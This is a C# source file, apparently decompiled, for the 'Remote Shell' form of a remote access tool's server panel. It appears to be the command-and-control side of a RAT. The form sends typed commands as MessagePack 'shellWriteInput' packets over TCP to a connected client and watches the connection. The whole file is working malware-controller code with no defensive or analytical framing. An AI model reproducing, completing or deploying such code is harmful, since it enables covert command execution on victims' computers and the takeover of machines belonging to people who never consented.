using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.XtraEditors;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Server.Connection;

namespace Server.Forms;

public class FormShell : XtraForm
{
	private IContainer components;

	public RichTextBox richTextBox1;

	public System.Windows.Forms.Timer timer1;

	private TextEdit textBox1;

	private XtraTabControl xtraTabControl2;

	private XtraTabPage xtraTabPage2;

	public FormMain F { get; set; }

	internal Clients Client { get; set; }

	public FormShell()
	{
		InitializeComponent();
	}

	private void TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(textBox1.Text))
		{
			if (textBox1.Text == "cls".ToLower())
			{
				richTextBox1.Clear();
				textBox1.Text = "";
			}
			if (textBox1.Text == "exit".ToLower())
			{
				Close();
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
			msgPack.ForcePathObject("WriteInput").AsString = textBox1.Text;
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			textBox1.Text = "";
		}
	}

	private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
			msgPack.ForcePathObject("WriteInput").AsString = "exit";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
		catch
		{
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormShell));
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.textBox1 = new DevExpress.XtraEditors.TextEdit();
		this.xtraTabControl2 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage2 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.textBox1.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).BeginInit();
		this.xtraTabControl2.SuspendLayout();
		this.xtraTabPage2.SuspendLayout();
		base.SuspendLayout();
		this.richTextBox1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.richTextBox1.Font = new System.Drawing.Font("Consolas", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.richTextBox1.ForeColor = System.Drawing.Color.FromArgb(248, 248, 242);
		this.richTextBox1.Location = new System.Drawing.Point(0, 0);
		this.richTextBox1.Margin = new System.Windows.Forms.Padding(2);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.ReadOnly = true;
		this.richTextBox1.Size = new System.Drawing.Size(574, 340);
		this.richTextBox1.TabIndex = 0;
		this.richTextBox1.Text = "";
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.textBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.textBox1.Location = new System.Drawing.Point(0, 371);
		this.textBox1.Name = "textBox1";
		this.textBox1.Size = new System.Drawing.Size(576, 30);
		this.textBox1.TabIndex = 2;
		this.textBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(TextBox1_KeyDown);
		this.xtraTabControl2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl2.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl2.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl2.Name = "xtraTabControl2";
		this.xtraTabControl2.SelectedTabPage = this.xtraTabPage2;
		this.xtraTabControl2.Size = new System.Drawing.Size(576, 371);
		this.xtraTabControl2.TabIndex = 11;
		this.xtraTabControl2.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage2 });
		this.xtraTabPage2.Controls.Add(this.richTextBox1);
		this.xtraTabPage2.Name = "xtraTabPage2";
		this.xtraTabPage2.Size = new System.Drawing.Size(574, 340);
		base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(576, 401);
		base.Controls.Add(this.xtraTabControl2);
		base.Controls.Add(this.textBox1);
		base.FormBorderEffect = DevExpress.XtraEditors.FormBorderEffect.Glow;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormShell.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormShell.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		this.MaximumSize = new System.Drawing.Size(578, 435);
		this.MinimumSize = new System.Drawing.Size(578, 435);
		base.Name = "FormShell";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Remote Shell";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormShell_FormClosed);
		((System.ComponentModel.ISupportInitialize)this.textBox1.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).EndInit();
		this.xtraTabControl2.ResumeLayout(false);
		this.xtraTabPage2.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
